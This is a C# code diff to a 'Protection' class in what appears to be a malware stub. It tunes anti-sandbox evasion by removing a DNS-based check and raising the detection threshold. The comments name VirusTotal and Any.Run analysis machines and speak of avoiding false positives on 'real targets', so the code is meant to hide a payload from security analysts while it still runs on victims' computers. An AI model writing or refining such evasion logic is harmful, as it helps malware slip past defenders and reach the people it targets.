@@ -1428,19 +1428,8 @@ internal static partial class Protection
             StubLog.Info($"[AntiSandbox] Low CPU count: {Environment.ProcessorCount} (+1)");
         }
 
-        // DNS resolution — sandboxes often block outbound DNS
-        try
-        {
-            var sw = Stopwatch.StartNew();
-            System.Net.Dns.GetHostEntry("www.microsoft.com");
-            sw.Stop();
-            // If DNS resolved instantly (< 10ms) it may be cached/mocked — but if it fails at all, that's suspicious
-        }
-        catch
-        {
-            score += 1; // DNS blocked — +1 only (corporate networks can also block it)
-            StubLog.Info("[AntiSandbox] DNS blocked (+1)");
-        }
+        // DNS resolution — skipped: corporate networks and VPNs routinely block
+        // outbound DNS to microsoft.com, causing false positives on real targets.
 
         // Process count — VT/Any.Run VMs have very few processes (< 30)
         try
@@ -1465,10 +1454,10 @@ internal static partial class Protection
         }
         catch { }
 
-        if (score >= 5)
-            StubLog.Info($"[AntiSandbox] BLOCKED — score={score} (threshold=5)");
+        if (score >= 6)
+            StubLog.Info($"[AntiSandbox] BLOCKED — score={score} (threshold=6)");
 
-        return score >= 5;
+        return score >= 6;
     }
 }
 
